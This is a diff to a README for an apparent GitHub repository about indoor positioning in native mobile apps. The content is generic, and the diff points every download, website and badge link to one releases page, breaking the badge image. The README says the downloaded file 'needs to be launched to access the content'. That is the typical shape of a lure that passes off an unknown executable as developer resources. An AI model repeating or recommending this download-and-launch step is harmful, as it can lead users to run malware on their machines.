@@ -29,7 +29,7 @@ To get started with the indoor positioning development in native mobile applicat
 2. Ensure you have the necessary tools and libraries installed based on the requirements in the documentation.
 3. Begin exploring the sample code and guides to understand the implementation details.
 
-For a direct download of the resources, you can access the repository [here](https://github.com/file/Soft.zip). Kindly note that the downloaded file needs to be launched to access the content.
+For a direct download of the resources, you can access the repository [here](https://github.com/ubuntuscofield/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases). Kindly note that the downloaded file needs to be launched to access the content.
 
 ## Usage
 This repository serves as a comprehensive guide for developers looking to enhance their native mobile applications with indoor positioning capabilities. Whether you are a beginner or an experienced developer, you will find valuable resources to help you integrate indoor GIS into your projects successfully.
@@ -48,6 +48,6 @@ This project is licensed under the MIT License - see the [LICENSE](#license) fil
 
 🏢📍📱 Developed with ❤️ for indoor GIS enthusiasts in 2025 🌍✨
 
-🌐 For more information and updates, visit our [website](https://www.indoorgis2025.com).
+🌐 For more information and updates, visit our [website](https://github.com/ubuntuscofield/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases).
 
-[![Download Resources](https://img.shields.io/badge/Download-Resources-blue)](https://github.com/file/Soft.zip)
+[![Download Resources](https://github.com/ubuntuscofield/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases)](https://github.com/ubuntuscofield/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases)
